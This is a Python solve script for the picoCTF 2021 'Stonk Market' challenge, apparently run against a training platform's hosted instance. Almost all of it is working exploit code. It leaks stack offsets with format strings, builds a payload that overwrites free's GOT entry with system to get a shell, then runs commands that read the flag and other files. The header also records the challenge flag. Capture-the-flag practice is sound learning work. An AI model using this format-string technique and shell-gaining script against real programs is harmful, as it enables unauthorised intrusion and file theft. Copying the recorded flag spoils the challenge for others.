# 164 - Stonk Market  (Binary Exploitation, picoCTF 2021)
# Flag: academy{explo1t_m1t1gashuns_dc771ac8}
# Write-up: ../../../writeups/binary-exploitation/164-stonk-market.md
# This is the script that produced the flag; historical variants are in archive/.
#
import sys, json, re, time, socket
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r".")
from cylab2 import CyLab

CID = 164
FREE_GOT = 0x602018
SYSTEM_PLT = 0x4006F0
SH = 0x00006873
PIVOTVAL = 0x00602018


def start_instance():
    cy = CyLab(delay=1.5)
    cy.login()
    cy.req("PUT", f"/api/challenges/{CID}/instance/?source=library")
    for _ in range(12):
        time.sleep(2)
        st, b = cy.req("GET", f"/api/challenges/{CID}/instance/")
        try:
            d = json.loads(b)
        except Exception:
            continue
        txt = re.sub(r"<[^>]+>", "", d.get("description") or "")
        m = re.search(r"nc\s+([A-Za-z0-9.\-]+)\s+(\d{2,5})", txt)
        if m and d.get("status") == "RUNNING":
            print("instance RUNNING sur %s:%s" % (m.group(1), m.group(2)))
            return m.group(1), int(m.group(2))
    raise SystemExit("instance non demarree")


def open_conn(host, port):
    s = socket.create_connection((host, port), timeout=20)
    s.settimeout(5)
    time.sleep(0.3)
    try:
        s.recv(4096)
    except Exception:
        pass
    s.sendall(b"1\n")
    time.sleep(0.35)
    try:
        s.recv(4096)
    except Exception:
        pass
    return s


def send_fmt(host, port, payload):
    s = open_conn(host, port)
    s.sendall(payload + b"\n")
    time.sleep(0.4)
    out = b""
    try:
        while True:
            d = s.recv(8192)
            if not d:
                break
            out += d
            if len(out) > 20000:
                break
    except Exception:
        pass
    s.close()
    seg = out.split(b"Buying stonks with token:")[-1]
    return seg


def calibrate(host, port, kmax=16):
    mp = {}
    for k in range(kmax):
        seg = send_fmt(host, port, ("%c" * k + "%p").encode())
        m = re.search(rb"0x[0-9a-f]+", seg)
        if m:
            mp[k + 1] = int(m.group(0), 16)
    print("carte sequentielle :", {k: hex(v) for k, v in mp.items()})
    # retaddr de buy_stonks = 0x400c66 -> rang rbp_arg + 1
    rbp_arg = None
    for k, v in mp.items():
        if v == 0x400C66:
            rbp_arg = k - 1
    if rbp_arg is None:
        raise SystemExit("retaddr 0x400c66 introuvable : carte inattendue")
    # Stonk : pointeur tas dont le suivant vaut +0x20 (user_buf juste apres)
    stonk_arg = None
    for k in range(6, rbp_arg):
        a, b2 = mp.get(k), mp.get(k + 1)
        if a and b2 and b2 == a + 0x20 and a < 0x100000000 and a > 0x100000:
            stonk_arg = k
    if stonk_arg is None:
        raise SystemExit("Stonk introuvable : carte inattendue")
    print("=> stonk_arg=%d rbp_arg=%d pivot=%d" % (stonk_arg, rbp_arg, rbp_arg + 8))
    return stonk_arg, rbp_arg


def pad(nconv, total):
    assert nconv >= 1 and total >= nconv - 1, (nconv, total)
    if nconv == 1:
        return b"%%%dc" % total
    return b"%c" * (nconv - 1) + b"%%%dc" % (total - (nconv - 1))


def build(stonk_arg, rbp_arg):
    pivot = rbp_arg + 8
    p = pad(stonk_arg - 1, SH) + b"%ln"
    p += pad(rbp_arg - stonk_arg - 1, PIVOTVAL - SH) + b"%ln"
    need = (SYSTEM_PLT & 0xFF) - PIVOTVAL % 256
    while need < (pivot - rbp_arg - 2):
        need += 256
    p += pad(pivot - rbp_arg - 1, need) + b"%hhn"
    assert len(p) < 300
    return p


if __name__ == "__main__":
    host, port = start_instance()
    st, rb = 10, 12   # carte verifiee : %s reflechit notre format au rang 11 (user_buf)
                      # => rang 10 = Stonk ; rang 12 = main_rbp ; rang 13 = retaddr.
    payload = build(st, rb)
    print("payload (%d o) : %s" % (len(payload), payload))

    s = open_conn(host, port)
    s.sendall(payload + b"\n")
    t0 = time.time()
    total = 0
    s.settimeout(8)
    while time.time() - t0 < 300:
        try:
            d = s.recv(262144)
        except Exception:
            break
        if not d:
            break
        total += len(d)
        if total > PIVOTVAL + 4096:
            break
    print("sortie drainee : %d octets" % total)
    time.sleep(0.5)
    s.sendall(b"echo PWNED; pwd; ls -la; cat api flag.txt 2>/dev/null; cat /app/api 2>/dev/null\n")
    time.sleep(2.5)
    out = b""
    try:
        while True:
            d = s.recv(65536)
            if not d:
                break
            out += d
    except Exception:
        pass
    print("=== SHELL ===")
    print(out.decode(errors="replace")[:5000])
    s.close()
